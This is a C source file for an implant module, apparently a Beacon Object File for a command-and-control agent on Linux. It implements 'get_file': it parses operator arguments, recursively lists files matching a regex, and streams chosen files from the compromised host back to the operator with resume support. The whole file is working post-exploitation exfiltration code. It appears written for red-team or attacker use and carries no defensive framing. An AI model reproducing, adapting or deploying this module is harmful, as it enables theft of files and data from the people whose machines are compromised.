/*
 * file_transfer_bof.c — get_file, agent -> operator, as a Linux BOF.
 *
 * The agent exposes one stream primitive here: UploadFile streams a local file
 * to the operator, starting at a resume offset. This object owns the transfer
 * policy: the directory walk and the resume offset. Operator uploads are a
 * plain agent command (put), not a BOF.
 */

#include <dirent.h>
#include <regex.h>
#include <stdio.h>
#include <string.h>

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

#define XFER_WALK_MAX_DEPTH 64

#define CALLBACK_OUTPUT 0x0
#define CALLBACK_ERROR 0x0d

typedef struct {
  char *buffer;
  int length;
  int size;
} datap;

/* The argument block is the Windows COFFLoader wire format: a 4-byte body
 * length followed by length-prefixed values. Parsing it here keeps the object
 * free of the x86-only syscall helpers in bof_common, so the same source also
 * builds for RV32. */
static void BeaconDataParse(datap *parser, char *buffer, int size) {
  if (parser == NULL)
    return;
  parser->buffer = buffer;
  parser->length = 0;
  parser->size = 0;
  if (buffer == NULL || size < 4)
    return;
  int body = 0;
  memcpy(&body, buffer, 4);
  int available = size - 4;
  if (body < 0 || body > available)
    body = available;
  parser->buffer = buffer + 4;
  parser->length = body;
  parser->size = body;
}

static int BeaconDataInt(datap *parser) {
  if (parser == NULL || parser->length < 4) {
    return 0;
  }
  int v = 0;
  memcpy(&v, parser->buffer, 4);
  parser->buffer += 4;
  parser->length -= 4;
  return v;
}

static char *BeaconDataExtract(datap *parser, int *size) {
  if (size != NULL)
    *size = 0;
  if (parser == NULL || parser->length < 4)
    return NULL;
  int len = 0;
  memcpy(&len, parser->buffer, 4);
  parser->buffer += 4;
  parser->length -= 4;
  if (len < 0 || len > parser->length)
    return NULL;
  char *out = parser->buffer;
  parser->buffer += len;
  parser->length -= len;
  if (size != NULL)
    *size = len;
  return out;
}

extern void BeaconPrintf(int type, const char *fmt, ...);
extern int UploadFile(const char *token, const char *path, unsigned long offset,
                      char *err, int err_cap);

static int is_mem_path(const char *path) {
  return path != NULL && strncmp(path, "memfs://", 8) == 0;
}

/* Print every regular file under `dir` whose name matches `re` (all of them
 * when `re` is NULL). Returns the count, or -1 when the directory cannot be
 * opened. Depth is capped so a symlink loop cannot run forever. */
static int walk_dir(const char *dir, const regex_t *re, int depth) {
  if (depth > XFER_WALK_MAX_DEPTH)
    return 0;
  DIR *d = opendir(dir);
  if (d == NULL) {
    BeaconPrintf(CALLBACK_ERROR, "get_file: cannot open directory %s", dir);
    return -1;
  }

  int found = 0;
  struct dirent *ent;
  while ((ent = readdir(d)) != NULL) {
    if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
      continue;

    char path[PATH_MAX];
    int n = snprintf(path, sizeof(path), "%s/%s", dir, ent->d_name);
    if (n < 0 || (size_t)n >= sizeof(path))
      continue;

    /* d_type is filled in on every filesystem a BOF is likely to walk; when
     * it is not, opening the entry is the only portable directory test. */
    int is_dir = ent->d_type == DT_DIR;
    if (ent->d_type == DT_UNKNOWN) {
      DIR *probe = opendir(path);
      if (probe != NULL) {
        closedir(probe);
        is_dir = 1;
      }
    }
    if (is_dir) {
      int sub = walk_dir(path, re, depth + 1);
      if (sub < 0) {
        closedir(d);
        return -1;
      }
      found += sub;
      continue;
    }
    if (ent->d_type != DT_REG && ent->d_type != DT_LNK &&
        ent->d_type != DT_UNKNOWN)
      continue;
    if (re != NULL && regexec(re, ent->d_name, 0, NULL, 0) != 0)
      continue;
    BeaconPrintf(CALLBACK_OUTPUT, "%s", path);
    found++;
  }
  closedir(d);
  return found;
}

static void do_get(char *args, int len) {
  datap parser;
  BeaconDataParse(&parser, args, len);
  char *path = BeaconDataExtract(&parser, NULL);
  int offset = BeaconDataInt(&parser);
  char *token = BeaconDataExtract(&parser, NULL);
  char *filter = BeaconDataExtract(&parser, NULL);

  if (path == NULL || path[0] == '\0') {
    BeaconPrintf(CALLBACK_ERROR, "get_file: missing path");
    return;
  }
  if (token == NULL || token[0] == '\0') {
    BeaconPrintf(CALLBACK_ERROR, "get_file: missing stream token");
    return;
  }
  if (filter == NULL)
    filter = "";
  if (offset < 0) {
    BeaconPrintf(CALLBACK_ERROR, "get_file: invalid offset %d", offset);
    return;
  }

  /* A directory is listed, everything else is streamed. opendir is the only
   * check the BOF needs: stat is not portable across the loader's host libc
   * ABIs, and the agent validates the source and the resume offset when it
   * opens the stream. */
  if (!is_mem_path(path)) {
    DIR *d = opendir(path);
    if (d != NULL) {
      closedir(d);
      regex_t re;
      int have_re = 0;
      if (filter[0] != '\0') {
        if (regcomp(&re, filter, REG_EXTENDED | REG_NOSUB) != 0) {
          BeaconPrintf(CALLBACK_ERROR, "get_file: invalid filter %s", filter);
          return;
        }
        have_re = 1;
      }
      int found = walk_dir(path, have_re ? &re : NULL, 0);
      if (have_re)
        regfree(&re);
      if (found >= 0)
        BeaconPrintf(CALLBACK_OUTPUT, "get_file: %d file(s) in %s", found,
                     path);
      return;
    }
  }

  char err[160] = {0};
  /* The agent streams the file over the FTP route; the BOF never reads it into
   * memory, so file size is not bounded by the BOF or agent heap. */
  int rc =
      UploadFile(token, path, (unsigned long)offset, err, (int)sizeof(err));
  if (rc != 0) {
    BeaconPrintf(CALLBACK_ERROR, "get_file: %s: %s", path,
                 err[0] ? err : "upload failed");
    return;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "get_file: %s sent", path);
}

void go(char *args, int len) { do_get(args, len); }
